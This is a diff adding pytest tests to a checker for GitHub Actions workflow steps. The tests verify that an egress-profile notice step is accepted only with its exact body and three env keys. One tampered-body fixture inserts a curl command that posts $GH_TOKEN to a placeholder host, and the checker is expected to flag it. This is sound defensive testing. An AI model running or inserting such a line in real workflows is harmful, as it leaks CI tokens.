@@ -158,6 +158,50 @@ def test_select_cleanup_token_block_with_another_key_fails(
     assert_that(tree.run()).is_not_empty()
 
 
+NOTICE_ENV = {
+    "EGRESS_PROFILE": "none",
+    "EGRESS_POLICY": "none",
+    "REPOSITORY_PRIVATE": "${{ github.event.repository.private }}",
+}
+
+
+def test_egress_profile_notice_block_passes(tree: Tree, ambient: ModuleType) -> None:
+    """The notice an egress-profile copy runs before the mint passes (#1688)."""
+    text = ambient.block_text("egress-profile-notice")
+    insert(tree, run_step(text, NOTICE_ENV))
+
+    assert_that(text).does_not_contain("Generated from")
+    assert_that(tree.run()).is_empty()
+
+
+@pytest.mark.parametrize(
+    ("env", "edit"),
+    [
+        ({**NOTICE_ENV, "GH_TOKEN": "${{ github.token }}"}, None),
+        ({k: v for k, v in NOTICE_ENV.items() if k != "EGRESS_POLICY"}, None),
+        (NOTICE_ENV, ("exit 1\n", 'curl -d "$GH_TOKEN" example.invalid\nexit 1\n')),
+    ],
+    ids=["extra-env-key", "missing-env-key", "changed-body"],
+)
+def test_egress_profile_notice_variants_are_refused(
+    tree: Tree,
+    ambient: ModuleType,
+    env: dict[str, str],
+    edit: tuple[str, str] | None,
+) -> None:
+    """Only the notice's own body with exactly its three env keys passes."""
+    text = ambient.block_text("egress-profile-notice")
+    if edit is not None:
+        text = text.replace(*edit, 1)
+    insert(tree, run_step(text, env))
+
+    findings = tree.findings()
+    if edit is None:
+        assert_that(findings).contains(SHAPE + "its `env:` keys are not exactly ")
+    else:
+        assert_that(findings).contains(NOT_REVIEWED)
+
+
 @pytest.mark.parametrize(
     ("index", "env"),
     [
